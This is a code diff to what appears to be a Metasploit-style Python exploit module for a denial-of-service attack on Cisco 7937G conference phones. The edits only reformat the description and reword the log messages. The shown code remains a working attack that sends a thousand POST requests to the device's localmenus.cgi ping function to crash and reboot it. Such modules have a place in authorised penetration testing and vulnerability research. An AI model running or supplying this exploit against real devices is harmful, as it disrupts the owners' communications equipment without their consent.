@@ -26,7 +26,10 @@ except ImportError:
 metadata = {
     'name': 'Cisco 7937G Denial-of-Service Reboot Attack',
     'description': '''
-	This module exploits a bug in how the conference station handles executing a ping via it's web interface. By repeatedly executing the ping function without clearing out the resulting output, a DoS is caused that will reset the device after a few minutes.
+	This module exploits a bug in how the conference station handles 
+	executing a ping via it's web interface. By repeatedly executing 
+	the ping function without clearing out the resulting output, 
+	a DoS is caused that will reset the device after a few minutes.
     ''',
     'authors': [
         'Cody Martin'
@@ -45,8 +48,7 @@ metadata = {
         'rhost': {'type': 'address', 
 		  'description': 'Target address', 
 		  'required': True, 
-		  'default': 'None'
-	}
+		  'default': 'None'}
     }
 }
 
@@ -66,7 +68,8 @@ def run(args):
     url = "http://{}/localmenus.cgi".format(args['rhost'])
     data = ''.join(random.choice(string.ascii_letters) for i in range(46))
     payload = {"func": "609", "data": data, "rphl": "1"}
-    logging.info("Sending DoS Packets. Stand by.")
+    logging.info("Sending POST requests triggering the PING function.")
+    logging.info("Device should crash with a DoS shortly...")
     for i in range(1000):
         try:
             r = requests.post(url=url, params=payload, timeout=5)
